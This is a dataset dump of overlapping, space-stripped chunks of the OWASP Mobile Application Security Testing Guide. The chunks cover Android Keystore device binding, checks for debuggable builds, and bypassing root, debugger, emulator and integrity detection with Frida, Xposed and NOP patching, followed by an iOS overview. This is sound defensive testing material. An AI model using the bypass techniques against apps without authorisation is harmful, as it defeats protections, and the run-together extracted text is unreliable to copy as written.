Beforewedescribetheusableidentifiers,let’squicklydiscusshowtheycanbeusedforbinding. Therearethreemethods thatallowdevicebinding: • Augmentingthecredentialsusedforauthenticationwithdeviceidentifiers. Thismakesenseiftheapplicationneeds tore-authenticateitselfand/ortheuserfrequently. • Encryptingthedatastoredinthedevicewiththekeymaterialwhichisstronglyboundtothedevicecanstrengthen the device binding. The Android Keystore offers non-exportable private keys which we can use for this. When a maliciousactorwouldextractsuchdatafromadevice,itwouldn’tbepossibletodecryptthedata,asthekeyisnot accessible. Implementingthis,takesthefollowingsteps: – GeneratethekeypairintheAndroidKeystoreusingKeyGenParameterSpecAPI. //Source:<https://developer.android.com/reference/android/security/keystore/KeyGenParameterSpec.html> KeyPairGeneratorkeyPairGenerator =KeyPairGenerator.getInstance( KeyProperties.KEY_ALGORITHM_RSA,\"AndroidKeyStore\"); keyPairGenerator.initialize( newKeyGenParameterSpec.Builder( \"key1\", KeyProperties.PURPOSE_DECRYPT) .setDigests(KeyProperties.DIGEST_SHA256,KeyProperties.DIGEST_SHA512) .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_RSA_OAEP) .build()); KeyPairkeyPair =keyPairGenerator.generateKeyPair(); Ciphercipher =Cipher.getInstance(\"RSA/ECB/OAEPWithSHA-256AndMGF1Padding\"); cipher.init(Cipher.DECRYPT_MODE,keyPair.getPrivate()); ...",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 116
    }
  },
  {
    "text": "thandeviceB.ThesedifferentialprivilegesshouldnotchangewhenanappiscopiedfromdeviceAtodeviceB. Beforewedescribetheusableidentifiers,let’squicklydiscusshowtheycanbeusedforbinding. Therearethreemethods thatallowdevicebinding: • Augmentingthecredentialsusedforauthenticationwithdeviceidentifiers. Thismakesenseiftheapplicationneeds tore-authenticateitselfand/ortheuserfrequently. • Encryptingthedatastoredinthedevicewiththekeymaterialwhichisstronglyboundtothedevicecanstrengthen the device binding. The Android Keystore offers non-exportable private keys which we can use for this. When a maliciousactorwouldextractsuchdatafromadevice,itwouldn’tbepossibletodecryptthedata,asthekeyisnot accessible. Implementingthis,takesthefollowingsteps: – GeneratethekeypairintheAndroidKeystoreusingKeyGenParameterSpecAPI. //Source:<https://developer.android.com/reference/android/security/keystore/KeyGenParameterSpec.html> KeyPairGeneratorkeyPairGenerator =KeyPairGenerator.getInstance( KeyProperties.KEY_ALGORITHM_RSA,\"AndroidKeyStore\"); keyPairGenerator.initialize( newKeyGenParameterSpec.Builder( \"key1\", KeyProperties.PURPOSE_DECRYPT) .setDigests(KeyProperties.DIGEST_SHA256,KeyProperties.DIGEST_SHA512) .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_RSA_OAEP) .build()); KeyPairkeyPair =keyPairGenerator.generateKeyPair(); Ciphercipher =Cipher.getInstance(\"RSA/ECB/OAEPWithSHA-256AndMGF1Padding\"); cipher.init(Cipher.DECRYPT_MODE,keyPair.getPrivate()); ... //ThekeypaircanalsobeobtainedfromtheAndroidKeystoreanytimeasfollows: KeyStorekeyStore =KeyStore.getInstance(\"AndroidKeyStore\"); keyStore.load(null); PrivateKeyprivateKey =(PrivateKey)keyStore.getKey(\"key1\",null); PublicKeypublicKey =keyStore.getCertificate(\"key1\").getPublicKey(); – GeneratingasecretkeyforAES-GCM: //Source:<https://developer.android.com/reference/android/security/keystore/KeyGenParameterSpec.html> KeyGeneratorkeyGenerator = KeyGenerator.getInstance( KeyProperties.KEY_ALGORITHM_AES,\"AndroidKeyStore\"); keyGenerator.init( newKeyGenParameterSpec.Builder(\"key2\", KeyProperties.PURPOSE_ENCRYPT |KeyProperties.PURPOSE_DECRYPT) .setBlockModes(KeyProperties.BLOCK_MODE_GCM) .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_NONE) 316\\n.build()); SecretKeykey =keyGenerator.generateKey(); //ThekeycanalsobeobtainedfromtheAndroidKeystoreanytimeasfollows: KeyStorekeyStore =KeyStore.getInstance(\"AndroidKeyStore\"); keyStore.load(null); key=(SecretKey)keyStore.getKey(\"key2\",null); – Encrypttheauthenticationdataandothersensitivedatastoredbytheapplicationusingasecretkeythrough AES-GCMcipherandusedevicespecificparameterssuchasInstanceID,etc. asassociateddata: Ciphercipher =Cipher.getInstance(\"AES/GCM/NoPadding\"); final byte[]nonce =newbyte[GCM_NONCE_LENGTH]; random.nextBytes(nonce); GCMParameterSpecspec =new GCMParameterSpec(GCM_TAG_LENGTH *8,nonce); cipher.init(Cipher.ENCRYPT_MODE,key,spec); byte[]aad=\"<deviceidentifierhere>\".getBytes();; cipher.updateAAD(aad); cipher.init(Cipher.ENCRYPT_MODE,key); //usetheciphertoencrypttheauthenticationdatasee0x50eformoredetails. – EncryptthesecretkeyusingthepublickeystoredinAndroidKeystoreandstoretheencryptedsecretkeyin theprivatestorageoftheapplication. – Wheneverauthenticationdatasuchasaccesstokensorothersensitivedataisrequired,decryptthesecretkey usingprivatekeystoredinAndroidKeystoreandthenusethedecryptedsecretkeytodecrypttheciphertext. • Usetoken-baseddeviceauthentication(InstanceID)tomakesurethatthesameinstanceoftheappisused. Testing whether the App is Debuggable Platform: android MASVSV1: MSTG-CODE-2 MASVSV2: MASVS-RESILIENCE-4 Overview Static Analysis Check AndroidManifest.xml to determine whether the android:debuggable attribute has been set and to find the attribute’svalue: ... <application android:allowBackup=\"true\" android:debuggable=\"true\" android:icon=\"@drawable/ic_launcher\" android:label=\"@string/app_name\" ↪ android:theme=\"@style/AppTheme\"> ... You can use aapt tool from the Android SDK with the following command line to quickly check if the an- droid:debuggable=\"true\"directiveispresent: ##Ifthecommandprint1thenthedirectiveispresent ##Theregexsearchforthisline:android:debuggable(0x0101000f)=(type0x12)0xffffffff $aaptdxmltreesieve.apkAndroidManifest.xml |grep -Ec\"android:debuggable\\(0x[0-9a-f]+\\)=\\(type\\s0x[0-9a-f]+\\)0xffffffff\" 1 Forareleasebuild,thisattributeshouldalwaysbesetto\"false\"(thedefaultvalue). Dynamic Analysis adbcanbeusedtodeterminewhetheranapplicationisdebuggable. Usethefollowingcommand: 317\\n##Ifthecommandprintanumbersuperiortozerothentheapplicationhavethedebugflag ##Theregexsearchfortheselines: ##flags=[DEBUGGABLEHAS_CODEALLOW_CLEAR_USER_DATAALLOW_BACKUP] ##pkgFlags=[DEBUGGABLEHAS_CODEALLOW_CLEAR_USER_DATAALLOW_BACKUP] $adbshelldumpsyspackagecom.mwr.example.sieve |grep -c\"DEBUGGABLE\" 2 $adbshelldumpsyspackagecom.nondebuggableapp |grep -c\"DEBUGGABLE\" 0 Ifanapplicationisdebuggable,executingapplicationcommandsistrivial. Intheadbshell,executerun-asbyappending thepackagenameandapplicationcommandtothebinaryname: $run-ascom.vulnerable.appid uid=10084(u0_a84)gid=10084(u0_a84) ↪ groups=10083(u0_a83),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats) ↪ context=u:r:untrusted_app:s0:c512,c768 AndroidStudiocanalsobeusedtodebuganapplicationandverifydebuggingactivationforanapp. Anothermethodfordeterminingwhetheranapplicationisdebuggableisattachingjdbtotherunningprocess. Ifthisis successful,debuggingwillbeactivated. Thefollowingprocedurecanbeusedtostartadebugsessionwithjdb: 1. Usingadbandjdwp,identifythePIDoftheactiveapplicationthatyouwanttodebug: $adb jdwp 2355 16346 <==last launched,correspondstoourapplication 2. Createacommunicationchannelbyusingadbbetweentheapplicationprocess(withthePID)andyourhostcom- puterbyusingaspecificlocalport: #adb forwardtcp:[LOCAL_PORT]jdwp:[APPLICATION_PID] $adb forwardtcp:55555jdwp:16346 3. Usingjdb,attachthedebuggertothelocalcommunicationchannelportandstartadebugsession: $jdb -connect com.sun.jdi.SocketAttach:hostname=localhost,port=55555 Setuncaught java.lang.Throwable Setdeferred uncaughtjava.lang.Throwable Initializingjdb ... >help Afewnotesaboutdebugging: • ThetoolJADXcanbeusedtoidentifyinterestinglocationsforbreakpointinsertion. • UsageofbasiccommandsforjdbcanbefoundatTutorialspoint. • Ifyougetanerrortellingthat“theconnectiontothedebuggerhasbeenclosed”whilejdbisbeingboundtothe localcommunicationchannelport,killalladbsessionsandstartasinglenewsession. Testing Reverse Engineering Tools Detection Platform: android MASVSV1: MSTG-RESILIENCE-4 MASVSV2: MASVS-RESILIENCE-4 Effectiveness Assessment Launchtheappwithvariousreverseengineeringtoolsandframeworksinstalledinyourtestdevice. Includeatleastthe following: Frida,Xposed,SubstrateforAndroid,RootCloak,AndroidSSLTrustKiller. Theappshouldrespondinsomewaytothepresenceofthosetools. Forexampleby: • Alertingtheuserandaskingforacceptingliability. 318\\n• Preventingexecutionbygracefullyterminating. • Securelywipinganysensitivedatastoredonthedevice. • Reportingtoabackendserver,e.g,forfrauddetection. Next,workonbypassingthedetectionofthereverseengineeringtoolsandanswerthefollowingquestions: • Canthemechanismsbebypassedtrivially(e.g.,byhookingasingleAPIfunction)? • Howdifficultisidentifyingtheantireverseengineeringcodeviastaticanddynamicanalysis? • Didyouneedtowritecustomcodetodisablethedefenses? Howmuchtimedidyouneed? • Whatisyourassessmentofthedifficultyofbypassingthemechanisms? Thefollowingstepsshouldguideyouwhenbypassingdetectionofreverseengineeringtools: 1. Patchtheantireverseengineeringfunctionality. Disabletheunwantedbehaviorbysimplyoverwritingtheassoci- atedbytecodeornativecodewithNOPinstructions. 2. UseFridaorXposedtohookfilesystemAPIsontheJavaandnativelayers. Returnahandletotheoriginalfile,not themodifiedfile. 3. Use a kernel module to intercept file-related system calls. When the process attempts to open the modified file, returnafiledescriptorfortheunmodifiedversionofthefile. Refertothe“TamperingandReverseEngineeringonAndroid”chapterforexamplesofpatching,codeinjection,andkernel modules. Testing Root Detection Platform: android MASVSV1: MSTG-RESILIENCE-1 MASVSV2: MASVS-RESILIENCE-1 Bypassing Root Detection Run execution traces with jdb, DDMS, strace, and/or kernel modules to find out what the app is doing. You’ll usually see all kinds of suspect interactions with the operating system, such as opening su for reading and obtaining a list of processes. Theseinteractionsaresurefiresignsofrootdetection. Identifyanddeactivatetherootdetectionmechanisms, oneatatime. Ifyou’reperformingablackboxresilienceassessment,disablingtherootdetectionmechanismsisyour firststep. Tobypassthesechecks,youcanuseseveraltechniques,mostofwhichwereintroducedinthe“ReverseEngineeringand Tampering”chapter: • Renamingbinaries. Forexample,insomecasessimplyrenamingthesubinaryisenoughtodefeatrootdetection (trynottobreakyourenvironmentthough!). • Unmounting/proctopreventreadingofprocesslists. Sometimes,theunavailabilityof/procisenoughtobypass suchchecks. • UsingFridaorXposedtohookAPIsontheJavaandnativelayers. Thishidesfilesandprocesses,hidesthecontents offiles,andreturnsallkindsofbogusvaluesthattheapprequests. • Hookinglow-levelAPIsbyusingkernelmodules. • Patchingtheapptoremovethechecks. Effectiveness Assessment Checkforrootdetectionmechanisms,includingthefollowingcriteria: • Multiple detection methods are scattered throughout the app (as opposed to putting everything into a single method). • TherootdetectionmechanismsoperateonmultipleAPIlayers(JavaAPIs,nativelibraryfunctions,assembler/system calls). 319\\n• Themechanismsaresomehoworiginal(they’renotcopiedandpastedfromStackOverfloworothersources). Developbypassmethodsfortherootdetectionmechanismsandanswerthefollowingquestions: • Canthemechanismsbeeasilybypassedwithstandardtools,suchasRootCloak? • Isstatic/dynamicanalysisnecessarytohandletherootdetection? • Doyouneedtowritecustomcode? • Howlongdidsuccessfullybypassingthemechanismstake? • Whatisyourassessmentofthedifficultyofbypassingthemechanisms? Ifrootdetectionismissingortooeasilybypassed,makesuggestionsinlinewiththeeffectivenesscriterialistedabove. These suggestions may include more detection mechanisms and better integration of existing mechanisms with other defenses. Testing File Integrity Checks Platform: android MASVSV1: MSTG-RESILIENCE-3 MASVSV2: MASVS-RESILIENCE-2 Bypassing File Integrity Checks Bypassing the application-source integrity checks 1. Patchtheanti-debuggingfunctionality. Disabletheunwantedbehaviorbysimplyoverwritingtheassociatedbyte- codeornativecodewithNOPinstructions. 2. Use Frida or Xposed to hook file system APIs on the Java and native layers. Return a handle to the original file insteadofthemodifiedfile. 3. Usethekernelmoduletointerceptfile-relatedsystemcalls. Whentheprocessattemptstoopenthemodifiedfile, returnafiledescriptorfortheunmodifiedversionofthefile. Refertothe“TamperingandReverseEngineeringonAndroid”chapterforexamplesofpatching,codeinjection,andkernel modules. Bypassing the storage integrity checks 1. Retrievethedatafromthedevice. 2. Altertheretrieveddataandthenputitbackintostorage.",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 117
    }
  },
  {
    "text": "Integrity Checks Bypassing the application-source integrity checks 1. Patchtheanti-debuggingfunctionality. Disabletheunwantedbehaviorbysimplyoverwritingtheassociatedbyte- codeornativecodewithNOPinstructions. 2. Use Frida or Xposed to hook file system APIs on the Java and native layers. Return a handle to the original file insteadofthemodifiedfile. 3. Usethekernelmoduletointerceptfile-relatedsystemcalls. Whentheprocessattemptstoopenthemodifiedfile, returnafiledescriptorfortheunmodifiedversionofthefile. Refertothe“TamperingandReverseEngineeringonAndroid”chapterforexamplesofpatching,codeinjection,andkernel modules. Bypassing the storage integrity checks 1. Retrievethedatafromthedevice. 2. Altertheretrieveddataandthenputitbackintostorage. Effectiveness Assessment Application-sourceintegritychecks: Runtheappinanunmodifiedstateandmakesurethateverythingworks. Applysimplepatchestoclasses.dexandany .so libraries in the app package. Re-package and re-sign the app as described in the “Basic Security Testing” chapter, thenruntheapp. Theappshoulddetectthemodificationandrespondinsomeway. Attheveryleast, theappshould alerttheuserand/orterminate. Workonbypassingthedefensesandanswerthefollowingquestions: • Canthemechanismsbebypassedtrivially(e.g.,byhookingasingleAPIfunction)? • Howdifficultisidentifyingtheanti-debuggingcodeviastaticanddynamicanalysis? • Didyouneedtowritecustomcodetodisablethedefenses? Howmuchtimedidyouneed? • Whatisyourassessmentofthedifficultyofbypassingthemechanisms? Storageintegritychecks: Anapproachsimilartothatforapplication-sourceintegritychecksapplies. Answerthefollowingquestions: • Canthemechanismsbebypassedtrivially(e.g.,bychangingthecontentsofafileorakey-value)? 320\\n• HowdifficultisgettingtheHMACkeyortheasymmetricprivatekey? • Didyouneedtowritecustomcodetodisablethedefenses? Howmuchtimedidyouneed? • Whatisyourassessmentofthedifficultyofbypassingthemechanisms? Testing for Debugging Symbols Platform: android MASVSV1: MSTG-CODE-3 MASVSV2: MASVS-RESILIENCE-3 Overview Static Analysis Symbolsareusuallystrippedduringthebuildprocess,soyouneedthecompiledbytecodeandlibrariestomakesurethat unnecessarymetadatahasbeendiscarded. First,findthenmbinaryinyourAndroidNDKandexportit(orcreateanalias). export NM=$ANDROID_NDK_DIR/toolchains/arm-linux-androideabi-4.9/prebuilt/darwin-x86_64/bin/arm-linux-androideabi-nm Todisplaydebugsymbols: $NM-alibfoo.so /tmp/toolchains/arm-linux-androideabi-4.9/prebuilt/darwin-x86_64/bin/arm-linux-androideabi-nm:libfoo.so:nosymbols Todisplaydynamicsymbols: $NM-Dlibfoo.so Alternatively,openthefileinyourfavoritedisassemblerandcheckthesymboltablesmanually. Dynamicsymbolscanbestrippedviathevisibilitycompilerflag. Addingthisflagcausesgcctodiscardthefunction nameswhilepreservingthenamesoffunctionsdeclaredasJNIEXPORT. Makesurethatthefollowinghasbeenaddedtobuild.gradle: externalNativeBuild{ cmake{ cppFlags\"-fvisibility=hidden\" } } Dynamic Analysis Staticanalysisshouldbeusedtoverifydebuggingsymbols. Testing for Debugging Code and Verbose Error Logging Platform: android MASVSV1: MSTG-CODE-4 MASVSV2: MASVS-RESILIENCE-3 321\\nOverview Static Analysis To determine whether StrictMode is enabled, you can look for the StrictMode.setThreadPolicy or StrictMode. setVmPolicymethods. Mostlikely,theywillbeintheonCreatemethod. Thedetectionmethodsforthethreadpolicyare detectDiskWrites() detectDiskReads() detectNetwork() Thepenaltiesforthreadpolicyviolationare penaltyLog()//LogsamessagetoLogCat penaltyDeath()//Crashesapplication,runsattheendofallenabledpenalties penaltyDialog()//Showsadialog HavealookatthebestpracticesforusingStrictMode. Dynamic Analysis There are several ways of detecting StrictMode; the best choice depends on how the policies’ roles are implemented. Theyinclude • Logcat, • awarningdialog, • applicationcrash. Testing Anti-Debugging Detection Platform: android MASVSV1: MSTG-RESILIENCE-2 MASVSV2: MASVS-RESILIENCE-4 Bypassing Debugger Detection There’s no generic way to bypass anti-debugging: the best method depends on the particular mechanism(s) used to prevent or detect debugging and the other defenses in the overall protection scheme. For example, if there are no integrity checks or you’ve already deactivated them, patching the app might be the easiest method. In other cases, a hooking framework or kernel modules might be preferable. The following methods describe different approaches to bypassdebuggerdetection: • Patchingtheanti-debuggingfunctionality: DisabletheunwantedbehaviorbysimplyoverwritingitwithNOPinstruc- tions. Notethatmorecomplexpatchesmayberequirediftheanti-debuggingmechanismiswelldesigned. • UsingFridaorXposedtohookAPIsontheJavaandnativelayers: manipulatethereturnvaluesoffunctionssuch asisDebuggableandisDebuggerConnectedtohidethedebugger. • Changingtheenvironment: Androidisanopenenvironment. Ifnothingelseworks,youcanmodifytheoperating systemtosubverttheassumptionsthedevelopersmadewhendesigningtheanti-debuggingtricks. 322\\nBypassing Example: UnCrackable App for Android Level 2 When dealing with obfuscated apps, you’ll often find that developers purposely “hide away” data and functionality in nativelibraries. You’llfindanexampleofthisinlevel2ofthe“UnCrackableAppforAndroid”. At first glance, the code looks like the prior challenge. A class called CodeCheck is responsible for verifying the code enteredbytheuser. Theactualcheckappearstooccurinthebarmethod,whichisdeclaredasanativemethod. package sg.vantagepoint.uncrackable2; public class CodeCheck { public CodeCheck(){ super(); } public boolean a(Stringarg2){ return this.bar(arg2.getBytes()); } private native boolean bar(byte[]arg1){ } } static { System.loadLibrary(\"foo\"); } PleaseseedifferentproposedsolutionsfortheAndroidCrackmeLevel2inGitHub. Effectiveness Assessment Checkforanti-debuggingmechanisms,includingthefollowingcriteria: • Attachingjdbandptrace-baseddebuggersfailsorcausestheapptoterminateormalfunction. • Multipledetectionmethodsarescatteredthroughouttheapp’ssourcecode(asopposedtotheirallbeinginasingle methodorfunction). • Theanti-debuggingdefensesoperateonmultipleAPIlayers(Java,nativelibraryfunctions,assembler/systemcalls). • The mechanisms are somehow original (as opposed to being copied and pasted from StackOverflow or other sources). Workonbypassingtheanti-debuggingdefensesandanswerthefollowingquestions: • Canthemechanismsbebypassedtrivially(e.g.,byhookingasingleAPIfunction)? • Howdifficultisidentifyingtheanti-debuggingcodeviastaticanddynamicanalysis? • Didyouneedtowritecustomcodetodisablethedefenses? Howmuchtimedidyouneed? • Whatisyoursubjectiveassessmentofthedifficultyofbypassingthemechanisms? Ifanti-debuggingmechanismsaremissingortooeasilybypassed,makesuggestionsinlinewiththeeffectivenesscriteria above. Thesesuggestionsmayincludeaddingmoredetectionmechanismsandbetterintegrationofexistingmechanisms withotherdefenses. Testing Runtime Integrity Checks Platform: android MASVSV1: MSTG-RESILIENCE-6 MASVSV2: MASVS-RESILIENCE-2 Effectiveness Assessment Makesurethatallfile-baseddetectionofreverseengineeringtoolsisdisabled. Then,injectcodebyusingXposed,Frida, andSubstrate,andattempttoinstallnativehooksandJavamethodhooks. Theappshoulddetectthe“hostile”codein itsmemoryandrespondaccordingly. Workonbypassingthecheckswiththefollowingtechniques: 323\\n1. Patchtheintegritychecks. Disabletheunwantedbehaviorbyoverwritingtherespectivebytecodeornativecode withNOPinstructions. 2. UseFridaorXposedtohooktheAPIsusedfordetectionandreturnfakevalues. Refertothe“TamperingandReverseEngineeringonAndroid”chapterforexamplesofpatching,codeinjection,andkernel modules. Testing Obfuscation Platform: android MASVSV1: MSTG-RESILIENCE-9 MASVSV2: MASVS-RESILIENCE-3 Overview Static Analysis DecompiletheAPKandreviewittodeterminewhetherthecodebasehasbeenobfuscated. Belowyoucanfindasampleforanobfuscatedcodeblock: package com.a.a.a; import com.a.a.b.a; import java.util.List; class a$b extends a { public a$b(ListparamList) { super(paramList); } public boolean areAllItemsEnabled() { return true; } public boolean isEnabled(intparamInt) { return true; } } Herearesomeconsiderations: • Meaningfulidentifiers,suchasclassnames,methodnames,andvariablenames,mighthavebeendiscarded. • Stringresourcesandstringsinbinariesmighthavebeenencrypted. • Codeanddatarelatedtotheprotectedfunctionalitymightbeencrypted,packed,orotherwiseconcealed. Fornativecode: •",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 118
    }
  },
  {
    "text": "android MASVSV1: MSTG-RESILIENCE-9 MASVSV2: MASVS-RESILIENCE-3 Overview Static Analysis DecompiletheAPKandreviewittodeterminewhetherthecodebasehasbeenobfuscated. Belowyoucanfindasampleforanobfuscatedcodeblock: package com.a.a.a; import com.a.a.b.a; import java.util.List; class a$b extends a { public a$b(ListparamList) { super(paramList); } public boolean areAllItemsEnabled() { return true; } public boolean isEnabled(intparamInt) { return true; } } Herearesomeconsiderations: • Meaningfulidentifiers,suchasclassnames,methodnames,andvariablenames,mighthavebeendiscarded. • Stringresourcesandstringsinbinariesmighthavebeenencrypted. • Codeanddatarelatedtotheprotectedfunctionalitymightbeencrypted,packed,orotherwiseconcealed. Fornativecode: • libcAPIs(e.gopen,read)mighthavebeenreplacedwithOSsyscalls. • Obfuscator-LLVMmighthavebeenappliedtoperform“ControlFlowFlattening”or“BogusControlFlow”. Some of these techniques are discussed and analyzed in the blog post“Security hardening of Android native code” by GautamArvindandinthe“APKiD:FastIdentificationofAppShieldingProducts”presentationbyEduardoNovella. Foramoredetailedassessment,youneedadetailedunderstandingoftherelevantthreatsandtheobfuscationmethods used. ToolssuchasAPKiDmaygiveyouadditionalindicationsaboutwhichtechniqueswereusedforthetargetappsuch asobfuscators,packersandanti-debugmeasures. 324\\nDynamic Analysis YoucanuseAPKiDtodetectiftheapphasbeenobfuscated. ExampleusingtheUnCrackableAppforAndroidLevel4: apkidowasp-mastg/Crackmes/Android/Level_04/r2pay-v1.0.apk [+]APKiD2.1.2::fromRedNaga::rednaga.io [*]owasp-mastg/Crackmes/Android/Level_04/r2pay-v1.0.apk!classes.dex |->anti_vm:Build.TAGScheck,possiblero.securecheck |->compiler:r8 |->obfuscator:unreadablefieldnames,unreadablemethodnames Inthiscaseitdetectsthattheapphasunreadablefieldnamesandmethodnames,amongotherthings. Testing Emulator Detection Platform: android MASVSV1: MSTG-RESILIENCE-5 MASVSV2: MASVS-RESILIENCE-1 Bypassing Emulator Detection 1. Patch the emulator detection functionality. Disable the unwanted behavior by simply overwriting the associated bytecodeornativecodewithNOPinstructions. 2. Use Frida or Xposed APIs to hook file system APIs on the Java and native layers. Return innocent-looking values (preferably taken from a real device) instead of the telltale emulator values. For example, you can override the TelephonyManager.getDeviceIDmethodtoreturnanIMEIvalue. Refertothe“TamperingandReverseEngineeringonAndroid”chapterforexamplesofpatching,codeinjection,andkernel modules. Effectiveness Assessment Installandruntheappintheemulator. Theappshoulddetectthatitisbeingexecutedinanemulatorandterminateor refusetoexecutethefunctionalitythat’smeanttobeprotected. Workonbypassingthedefensesandanswerthefollowingquestions: • Howdifficultisidentifyingtheemulatordetectioncodeviastaticanddynamicanalysis? • Canthedetectionmechanismsbebypassedtrivially(e.g.,byhookingasingleAPIfunction)? • Didyouneedtowritecustomcodetodisabletheanti-emulationfeature(s)? Howmuchtimedidyouneed? • Whatisyourassessmentofthedifficultyofbypassingthemechanisms? Making Sure that the App is Properly Signed Platform: android MASVSV1: MSTG-CODE-1 MASVSV2: MASVS-RESILIENCE-2 325\\nOverview Static Analysis Makesurethatthereleasebuildhasbeensignedviaboththev1andv2schemesforAndroid7.0(APIlevel24)andabove and via all the three schemes for Android 9 (API level 28) and above, and that the code-signing certificate in the APK belongstothedeveloper. APKsignaturescanbeverifiedwiththeapksignertool. Itislocatedat[SDK-Path]/build-tools/[version]. $apksignerverify --verbose Desktop/example.apk Verifies Verifiedusingv1scheme (JARsigning):true Verifiedusingv2scheme (APKSignatureSchemev2):true Verifiedusingv3scheme (APKSignatureSchemev3):true Numberofsigners:1 Thecontentsofthesigningcertificatecanbeexaminedwithjarsigner. NotethattheCommonName(CN)attributeis setto“AndroidDebug”inthedebugcertificate. TheoutputforanAPKsignedwithadebugcertificateisshownbelow: $jarsigner -verify -verbose -certs example.apk sm 11116FriNov1112:07:48ICT2016AndroidManifest.xml X.509,CN=AndroidDebug,O=Android,C=US [certificateisvalidfrom3/24/169:18AMto8/10/439:18AM] [CertPathnotvalidated:Pathdoesn\\'tchainwithanyofthetrustanchors] (...) Ignorethe“CertPathnotvalidated”error. ThiserroroccurswithJavaSDK7andabove. Insteadofjarsigner, youcan relyontheapksignertoverifythecertificatechain. The signing configuration can be managed through Android Studio or the signingConfig block in build.gradle. To activateboththev1andv2schemes,thefollowingvaluesmustbeset: v1SigningEnabledtrue v2SigningEnabledtrue SeveralbestpracticesforconfiguringtheappforreleaseareavailableintheofficialAndroiddeveloperdocumentation. Lastbutnotleast: makesurethattheapplicationisneverdeployedwithyourinternaltestingcertificates. Dynamic Analysis StaticanalysisshouldbeusedtoverifytheAPKsignature. 326\\niOS Platform Overview iOSisamobileoperatingsystemthatpowersApplemobiledevices,includingtheiPhone,iPad,andiPodTouch. Itisalso thebasisforAppletvOS,whichinheritsmanyfunctionalitiesfromiOS.ThissectionintroducestheiOSplatformfroman architecturepointofview. Thefollowingfivekeyareasarediscussed: 1. iOSsecurityarchitecture 2. iOSapplicationstructure 3. Inter-processCommunication(IPC) 4. iOSapplicationpublishing 5. iOSApplicationAttackSurface LiketheAppledesktopoperatingsystemmacOS(formerlyOSX),iOSisbasedonDarwin,anopensourceUnixoperating systemdevelopedbyApple. Darwin’skernelisXNU(“XisNotUnix”),ahybridkernelthatcombinescomponentsofthe MachandFreeBSDkernels. However,iOSappsruninamorerestrictedenvironmentthantheirdesktopcounterpartsdo. iOSappsareisolatedfrom eachotheratthefilesystemlevelandaresignificantlylimitedintermsofsystemAPIaccess. Toprotectusersfrommaliciousapplications, Applerestrictsandcontrolsaccesstotheappsthatareallowedtorunon iOSdevices. Apple’sAppStoreistheonlyofficialapplicationdistributionplatform. Theredeveloperscanoffertheirapps andconsumerscanbuy,download,andinstallapps. ThisdistributionstylediffersfromAndroid,whichsupportsseveral appstoresandsideloading(installinganapponyouriOSdevicewithoutusingtheofficialAppStore). IniOS,sideloading typicallyreferstotheappinstallationmethodviaUSB,althoughthereareotherenterpriseiOSappdistributionmethods thatdonotusetheAppStoreundertheAppleDeveloperEnterpriseProgram. Inthepast,sideloadingwaspossibleonlywithajailbreakorcomplicatedworkarounds. WithiOS9orhigher,itispossible tosideloadviaXcode. iOSappsareisolatedfromeachotherviaApple’siOSsandbox(historicallycalledSeatbelt),amandatoryaccesscontrol (MAC) mechanism describing the resources an app can and can’t access. Compared to Android’s extensive Binder IPC facilities,iOSoffersveryfewIPC(InterProcessCommunication)options,minimizingthepotentialattacksurface. Uniform hardware and tight hardware/software integration create another security advantage. Every iOS device offers securityfeatures,suchassecureboot,hardware-backedKeychain,andfilesystemencryption(referredasdataprotection iniOS).iOSupdatesareusuallyquicklyrolledouttoalargepercentageofusers,decreasingtheneedtosupportolder, unprotectediOSversions. InspiteofthenumerousstrengthsofiOS,iOSappdevelopersstillneedtoworryaboutsecurity. Dataprotection,Keychain, TouchID/FaceIDauthentication,andnetworksecuritystillleavealargemarginforerrors. Inthefollowingchapters,we describe iOS security architecture, explain a basic security testing methodology, and providereverse engineering how- tos. iOS Security Architecture TheiOSsecurityarchitecture,officiallydocumentedbyAppleintheiOSSecurityGuide,consistsofsixcorefeatures. This securityguideisupdatedbyAppleforeachmajoriOSversion: • HardwareSecurity • SecureBoot • CodeSigning • Sandbox • EncryptionandDataProtection • GeneralExploitMitigations 327\\nHardware Security The iOS security architecture makes good use of hardware-based security features that enhance overall performance. Each iOS device comes with two built-in Advanced Encryption Standard (AES) 256-bit keys. The device’s unique IDs (UIDs)andadevicegroupIDs(GIDs)areAES256-bitkeysfused(UID)orcompiled(GID)intotheApplicationProcessor (AP)andSecureEnclaveProcessor(SEP)duringmanufacturing. There’snodirectwaytoreadthesekeyswithsoftwareor debugginginterfacessuchasJTAG.EncryptionanddecryptionoperationsareperformedbyhardwareAEScrypto-engines thathaveexclusiveaccesstothesekeys. TheGIDisavaluesharedbyallprocessorsinaclassofdevicesusedtopreventtamperingwithfirmwarefilesandother cryptographic tasks not directly related to the user’s private data. UIDs, which are unique to each device, are used to protect the key hierarchy that’s used for device-level file system encryption. Because UIDs aren’t recorded during manufacturing,notevenApplecanrestorethefileencryptionkeysforaparticulardevice. Toallowsecuredeletionofsensitivedataonflashmemory,iOSdevicesincludeafeaturecalledEffaceableStorage. This featureprovidesdirectlow-levelaccesstothestoragetechnology,makingitpossibletosecurelyeraseselectedblocks. Secure Boot WhenaniOSdeviceispoweredon,itreadstheinitialinstructionsfromtheread-onlymemoryknownasBootROM,which bootstrapsthesystem. TheBootROMcontainsimmutablecodeandtheAppleRootCA,whichisetchedintothesilicon chipduringthefabricationprocess,therebycreatingtherootoftrust. Next,theBootROMmakessurethattheLLB’s(Low LevelBootloader)signatureiscorrect,andtheLLBchecksthattheiBootbootloader’ssignatureiscorrecttoo. Afterthe signatureisvalidated,theiBootchecksthesignatureofthenextbootstage,whichistheiOSkernel. Ifanyofthesesteps fail,thebootprocesswillterminateimmediatelyandthedevicewillenterrecoverymodeanddisplaytherestorescreen. However, if the Boot ROM fails to load, the device will enter a special low-level recovery mode called Device Firmware Upgrade(DFU).Thisisthelastresortforrestoringthedevicetoitsoriginalstate. Inthismode,thedevicewillshowno signofactivity;i.e.,itsscreenwon’tdisplayanything. 328\\nThis entire process",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 119
    }
  },
  {
